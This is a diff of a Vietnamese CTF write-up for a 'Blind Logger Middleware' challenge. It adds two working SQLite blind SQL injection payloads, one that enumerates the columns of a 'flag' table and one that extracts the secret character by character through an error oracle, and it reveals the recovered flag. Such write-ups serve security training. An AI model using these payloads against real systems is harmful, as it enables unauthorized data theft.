@@ -160,30 +160,18 @@ VALUES ('{ip_address}', '{user_agent}', null, null, null, null), (null,'', '{ref
 ![image](https://github.com/user-attachments/assets/e728ddf4-b962-4673-8e14-1585ba36baf4)
 
 - Có 2 bảng là `logger` và `flag`
-- Khai thác bảng `flag` với truy vấn và script này
+- Khai thác bảng `flag` để tìm tên các cột bảng với truy vấn và [script này](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Blind_Logger_Middleware_columns.py)
 
-`aaaaaaa`
+`', (SELECT CASE WHEN substr((SELECT name FROM pragma_table_info('flag') LIMIT 1 OFFSET {offset}), {index}, 1) = '{c}' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'`
 
 ![image](https://github.com/user-attachments/assets/4214545f-1e10-4b4f-b677-d8196c50a05e)
 
 - Vậy là có 2 cột là: `id` và `secret`
 
-- Tiếp tục khai thác cột `secret` để tìm flag có trong cột bằng truy vấn và script này
+- Tiếp tục khai thác cột `secret` để tìm flag có trong cột bằng truy vấn và [script này](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Blind_Logger_Middleware_flag.py)
 
-`dfsfsfs`
+`', (SELECT CASE WHEN substr((SELECT secret FROM flag LIMIT 1), {index}, 1) = '{c}' THEN 1 ELSE abs(-9223372036854775808) END), null, null, null),(null,'`
 
 ![image](https://github.com/user-attachments/assets/08051c0e-6683-4ebe-8e9b-f168a8a32fa7)
 
 - Lấy được flag: `CHH{blInD_sqLi_1N_UPDATE}`
-
-
-
-
-
-
-
-
-
-
-
-
